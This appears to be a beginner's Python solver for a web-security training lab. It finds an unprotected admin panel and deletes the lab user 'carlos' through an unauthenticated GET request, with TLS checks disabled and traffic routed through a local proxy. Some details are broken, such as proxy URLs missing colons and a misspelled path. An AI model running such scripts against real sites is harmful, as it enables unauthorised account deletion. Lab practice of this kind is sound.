import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def delete_user(url):
        admin_panal_url = url + '/administrator-panal'
        r = requests.get(admin_panal_url, verify = False, proxies = proxies)        
        if r.status_code == 200:
                print('(+) Found the administrator panal:')
                print('(+) Deleting Carlos User...')
                delete_carlos_url = admin_panal_url + '/delete?username=carlos'
                r = requests.get(delete_carlos_url, verify = False, proxies = proxies)                
                #Successful solving message 
                if r.status_code == 200:
                    print('(+) Successfully deleted the user from the database ')
                else:
                    print('(+) Failure to delete the user from the database')        
        else:
            print("(+) Administrator Panal does not found...")
            sys.exit(-1)
        
def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print(" (+) finding admin panal... ")
    delete_user(url)

if __name__ == '__main__':
    main()